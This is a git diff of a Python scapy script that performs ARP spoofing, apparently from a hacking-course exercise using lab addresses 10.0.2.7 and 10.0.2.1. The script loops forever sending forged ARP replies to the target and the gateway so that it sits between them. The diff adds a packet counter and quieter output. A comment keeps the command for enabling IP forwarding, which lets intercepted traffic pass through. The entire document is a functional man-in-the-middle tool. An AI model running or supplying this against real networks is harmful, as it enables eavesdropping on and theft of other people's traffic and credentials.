@@ -2,6 +2,7 @@
 
 import scapy.all as scapy
 import time
+import sys
 
 
 def get_mac(ip):
@@ -25,13 +26,18 @@ def spoof(target_ip, spoof_ip):
     # we wait a response  so we use 2
     packet = scapy.ARP(op=2,  pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     # pdst = target ip address   hwdst = own mac address   psrc= gateway
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
+sent_packets_count = 0
 while True:
     spoof("10.0.2.7", "10.0.2.1")
     spoof("10.0.2.1", "10.0.2.7")
+    sent_packets_count += 2
+    # \r  to write every print same line  (dynamic line)
+    print("\r[+] Packets sent:" + str(sent_packets_count), end="")
+    sys.stdout.flush()              # dont repeat print for every line
     time.sleep(2)
 
 
-# echo 1 > /proc/sys/net/ipv4/ip_forward    ip forwarding for linux
+# echo 1 > /proc/sys/net/ipv4/ip_forward
